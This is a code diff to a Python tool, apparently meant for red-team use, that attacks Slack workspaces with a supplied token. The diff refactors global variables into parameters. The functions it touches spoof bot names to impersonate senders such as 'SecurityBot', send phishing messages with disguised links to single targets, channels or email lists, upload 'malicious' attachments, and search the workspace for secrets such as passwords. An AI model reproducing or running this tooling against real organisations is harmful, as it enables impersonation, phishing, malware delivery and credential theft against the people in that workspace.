@@ -90,7 +90,6 @@ def checks():
 def lookupByChannel():
     lookup = t.conversations_list()
     channel_list = lookup['channels']
-    global user_id
     channels = {}
     for chan in range(0,len(channel_list)):
         name = channel_list[chan]['name']
@@ -102,6 +101,7 @@ def lookupByChannel():
         print(red+'ERROR: '+white+args.channel+red+' channel not found')
         exit()
     user_id = channel_id
+    return user_id
 
 def listChannels():
     lookup = t.conversations_list()
@@ -118,21 +118,18 @@ def listChannels():
         else:
             print(name)
         
-user_id = ""
 # lookup userid by email address
 def lookupByEmail():
     try:
         lookup = t.api_call("users.lookupByEmail?email=" + args.email)
-        global user_id
         user_id = lookup['user']['id']
+        return user_id
     except SlackApiError:
         print(red+'ERROR: '+ white+args.email.strip() + red+' not found in Slack')
         raise Exception
 
 # Send spoofed message
-botname,icon,message = '','',''
 def setupSpoofMessage():
-    global botname,icon,message
     div()
     botname = input(green+'Type the name you\'d like to impersonate\n'+blue+'Example: '+white+'SecurityBot\n'+white)
     div()
@@ -150,19 +147,18 @@ def setupSpoofMessage():
         print(red+'Message was not sent')
         setupSpoofMessage()
     elif args.email_list != None:
-        sendMessageToList()
+        sendMessageToList(botname,icon,message)
     elif args.email != None:
-        lookupByEmail()
-        sendMessage()
+        user_id = lookupByEmail()
+        sendMessage(user_id,botname,icon,message)
         print(green+'Message sent to '+white+args.email)
     elif args.channel != None:
-        lookupByChannel()
-        sendMessage()
+        user_id = lookupByChannel()
+        sendMessage(user_id,botname,icon,message)
         print(green+'Message sent to '+white+args.channel)
 
 # Send non-spoofed message
 def setupMessage():
-    global botname,icon,message
     div()
     message = input(green+'Type your slack message\n'+blue+'Example: '+white+'You have been mentioned in <https://google.com|Doc-3972>\n'+white)
     div()
@@ -170,26 +166,27 @@ def setupMessage():
           blue+'Slack Message: \n' + white+message 
         )
     div()
+    botname,icon = '',''
     ready = input(red+'Ready to send your message? y/n\n'+white)
     if ready != 'y' and ready != 'yes' and ready != 'Y':
         print(red+'Message was not sent')
         setupMessage()
     elif args.email_list != None:
-        sendMessageToList()
+        sendMessageToList(botname,icon,message)
     elif args.email != None:
         try:
-            lookupByEmail()
-            sendMessage()
+            user_id = lookupByEmail()
+            sendMessage(user_id,botname,icon,message)
             print(green+'Message sent to '+white+args.email)
         except:
             exit()
     elif args.channel != None:
-        lookupByChannel()
-        sendMessage()
+        user_id = lookupByChannel()
+        sendMessage(user_id,botname,icon,message)
         print(green+'Message sent to '+white+args.channel)
 
 # Sending to single target
-def sendMessage():
+def sendMessage(user_id,botname,icon,message):
     try:
         send = t.chat_postMessage(
             channel=user_id,
@@ -201,13 +198,13 @@ def sendMessage():
         print(red+'ERROR: '+white+e.response['error'])
         exit()
 # Sending to list of targets
-def sendMessageToList():
+def sendMessageToList(botname,icon,message):
     r = open(args.email_list)
     div()
     for address in r.readlines():
         try:
-            lookupByEmailList(address)
-            sendMessage()
+            user_id = lookupByEmailList(address)
+            sendMessage(user_id,botname,icon,message)
             print(green+"Message sent to: " + white+address)
         except:
             print(red+'ERROR: '+ white+address.strip() + red+' was not found in Slack. Message was not sent\n')
@@ -217,12 +214,11 @@ def sendMessageToList():
 # Lookup slack userid for each email in list
 def lookupByEmailList(email_address):
     lookup = t.api_call("users.lookupByEmail?email=" + email_address)
-    global user_id
-    user_id = lookup['user']['id']    
+    user_id = lookup['user']['id']
+    return user_id
 
-file_title = ''
+# Setup the message to be sent with attachment
 def setupFileMessage():
-    global message,file_title
     div()
     message = input(green + 'Type the slack message to accompany your malicious file\n'+blue+'Example: '+white+'Please take a look at this report asap!\n'+white)
     div()
@@ -239,25 +235,25 @@ def setupFileMessage():
         print(red+'Message was not sent')
         setupFileMessage()
     elif args.email_list != None:
-        sendFileToList()
+        sendFileToList(message,file_title)
     elif args.email != None:
         try:
-            lookupByEmail()
-            sendFile()
+            user_id = lookupByEmail()
+            sendFile(user_id,message,file_title)
             print(green+'File sent to '+white+args.email)
         except:
             exit()
     elif args.channel != None:
-        lookupByChannel()
-        sendFile()
+        user_id = lookupByChannel()
+        sendFile(user_id,message,file_title)
         print(green+'File sent to '+white+args.channel)
 
-def sendFileToList():
+def sendFileToList(message,file_title):
     r = open(args.email_list)
     for address in r.readlines():
         try:
-            lookupByEmailList(address)
-            sendFile()
+            user_id = lookupByEmailList(address)
+            sendFile(user_id,message,file_title)
             print(green+"File sent to: " + white+address)
         except:
             print(red+'ERROR: '+ white+address.strip() + red+' was not found in Slack. Message was not sent\n')
@@ -265,7 +261,7 @@ def sendFileToList():
             
     r.close()
 
-def sendFile():
+def sendFile(user_id,message,file_title):
     try:
         send = t.files_upload(
         channels=user_id,
@@ -277,6 +273,7 @@ def sendFile():
         print(red+'ERROR: '+white+e.response['error'])
         exit()
 
+# Search for secret using keyword
 def keywordSearch():
     div()
     keyword = input(green+'Type the keyword you\'d like to search for.\n'+blue+'Example: '+white+'password\n'+white)
@@ -407,7 +404,7 @@ def setupArgparse():
     group_attack.add_argument('-a','--attach',help='Send a message containing a malicious attachment (Requires -f and -e,-eL, or -cH)',action='store_true')
     group_args.add_argument('-f','--file',help='Path to file attachment',action='store')
     group_args.add_argument('-e','--email',help='Email of target',action='store')
-    group_args.add_argument('-cH','--channel',help='Target Slack Channel (Do not include #',action='store')
+    group_args.add_argument('-cH','--channel',help='Target Slack Channel (Do not include #)',action='store')
     group_args.add_argument('-eL','--email_list',help='Path to list of emails separated by newline',action='store')
     group_args.add_argument('-c','--check',help='Lookup and display the permissions and available attacks associated with your provided token.',action='store_true')
     group_args.add_argument('-o','--outfile',help='Outfile to store search results',action='store')
